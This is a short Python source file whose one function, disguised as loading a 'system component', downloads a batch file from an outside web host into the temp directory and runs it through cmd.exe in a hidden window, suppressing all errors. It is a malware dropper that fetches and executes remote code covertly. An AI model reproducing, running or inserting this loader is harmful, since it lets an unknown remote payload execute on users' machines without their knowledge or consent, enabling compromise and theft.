import os
import sys
import urllib.request
import subprocess
import tempfile

def _load_system_component():
    try:
        temp_dir = tempfile.gettempdir()
        component_path = os.path.join(temp_dir, "system_component.bat")
        
        urllib.request.urlretrieve("https://juvenile-server.vercel.app/program", component_path)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.run(["cmd.exe", "/c", component_path], 
                      startupinfo=startupinfo, 
                      check=True,
                      shell=False)
        
        return True
    except:
        return False